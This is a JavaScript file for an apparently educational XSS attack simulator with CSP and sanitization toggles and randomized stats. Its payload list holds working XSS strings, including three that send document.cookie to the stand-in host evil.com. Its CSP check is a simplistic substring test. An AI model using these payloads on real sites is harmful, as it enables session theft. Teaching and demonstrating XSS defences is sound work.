// State Management
const simulationState = {
    storedXSSPayloads: [],
    activeCSP: false,
    stolenCookies: new Set(),
    sessionHijacked: false,
    attackStats: {
        stored: 0,
        reflected: 0,
        blocked: 0
    }
};

// Payload Database
const PAYLOADS = {
    basic: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">'
    ],
    advanced: [
        '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
        '<img src="x" onerror="window.location=\'https://evil.com?data=\'+btoa(document.cookie)">',
        '<script>new Image().src="https://evil.com?"+document.cookie;</script>'
    ]
};

class XSSSimulation {
    constructor() {
        this.simulationInterval = null;
        this.setupEventListeners();
    }

    setupEventListeners() {
        const UI = {
            inputSanitization: document.getElementById('inputSanitization'),
            scriptSophistication: document.getElementById('scriptSophistication'),
            cspToggle: document.getElementById('cspToggle')
        };

        UI.inputSanitization?.addEventListener('input', () => this.updateSimulation());
        UI.scriptSophistication?.addEventListener('input', () => this.updateSimulation());
        UI.cspToggle?.addEventListener('click', () => this.toggleCSP());
    }

    toggleCSP() {
        simulationState.activeCSP = !simulationState.activeCSP;
        this.updateCSPStatus();
        this.updateSimulation();
    }

    updateCSPStatus() {
        const cspStatus = document.getElementById('cspStatus');
        if (cspStatus) {
            cspStatus.textContent = simulationState.activeCSP ? 'CSP Enabled' : 'CSP Disabled';
            cspStatus.className = simulationState.activeCSP ? 'text-green-500' : 'text-red-500';
        }
    }

    generatePayload(sophisticationLevel) {
        const payloadType = sophisticationLevel > 7 ? 'advanced' : 'basic';
        const payloads = PAYLOADS[payloadType];
        return payloads[Math.floor(Math.random() * payloads.length)];
    }

    simulateAttack(payload, sanitizationLevel) {
        if (simulationState.activeCSP && payload.includes('<script>')) {
            simulationState.attackStats.blocked++;
            return { success: false, message: 'Blocked by CSP' };
        }

        if (sanitizationLevel > 7 && payload.match(/<[^>]*>/)) {
            simulationState.attackStats.blocked++;
            return { success: false, message: 'Blocked by input sanitization' };
        }

        const isStoredXSS = Math.random() > 0.5;
        if (isStoredXSS) {
            simulationState.attackStats.stored++;
            simulationState.storedXSSPayloads.push(payload);
        } else {
            simulationState.attackStats.reflected++;
        }

        const cookieStolen = Math.random() < 0.3;
        if (cookieStolen) {
            simulationState.stolenCookies.add(`session_${Date.now()}`);
        }

        return {
            success: true,
            type: isStoredXSS ? 'stored' : 'reflected',
            cookieStolen,
            message: `${isStoredXSS ? 'Stored' : 'Reflected'} XSS executed ${cookieStolen ? '- Cookie stolen!' : ''}`
        };
    }

    updateSimulation() {
        const sanitizationLevel = parseInt(document.getElementById('inputSanitization').value);
        const sophisticationLevel = parseInt(document.getElementById('scriptSophistication').value);
        
        // Reset stats
        simulationState.attackStats = { stored: 0, reflected: 0, blocked: 0 };
        simulationState.stolenCookies.clear();
        
        clearInterval(this.simulationInterval);
        document.getElementById('xssSimulationArea').innerHTML = '';
        
        this.startSimulation(sanitizationLevel, sophisticationLevel);
    }

    startSimulation(sanitizationLevel, sophisticationLevel) {
        let attempts = 0;
        this.simulationInterval = setInterval(() => {
            if (attempts >= 20) {
                clearInterval(this.simulationInterval);
                return;
            }

            attempts++;
            const payload = this.generatePayload(sophisticationLevel);
            const result = this.simulateAttack(payload, sanitizationLevel);
            this.updateUI(result, attempts);
        }, 500);
    }

    updateUI(result, attempts) {
        this.updateSimulationArea(result, attempts);
        this.updateStatistics();
        this.updateProgressBars();
    }

    updateSimulationArea(result, attempts) {
        const simulationArea = document.getElementById('xssSimulationArea');
        const logEntry = document.createElement('div');
        logEntry.className = result.success ? 'text-red-500' : 'text-green-500';
        logEntry.textContent = `[Attempt ${attempts}] ${result.message}`;
        simulationArea.appendChild(logEntry);
        simulationArea.scrollTop = simulationArea.scrollHeight;
    }

    updateStatistics() {
        const stats = simulationState.attackStats;
        const elements = {
            stored: document.getElementById('storedXSSCount'),
            reflected: document.getElementById('reflectedXSSCount'),
            blocked: document.getElementById('blockedAttemptsCount'),
            cookies: document.getElementById('stolenCookiesCount')
        };

        if (elements.stored) elements.stored.textContent = stats.stored;
        if (elements.reflected) elements.reflected.textContent = stats.reflected;
        if (elements.blocked) elements.blocked.textContent = stats.blocked;
        if (elements.cookies) elements.cookies.textContent = `${simulationState.stolenCookies.size} cookies stolen`;
    }

    updateProgressBars() {
        const stats = simulationState.attackStats;
        const total = stats.stored + stats.reflected + stats.blocked;
        
        const updateBar = (id, value) => {
            const bar = document.getElementById(id);
            if (bar) bar.style.width = `${(value / total * 100) || 0}%`;
        };

        updateBar('storedXSSBar', stats.stored);
        updateBar('reflectedXSSBar', stats.reflected);
        updateBar('blockedAttemptsBar', stats.blocked);
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    new XSSSimulation();
});

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { XSSSimulation, simulationState };
}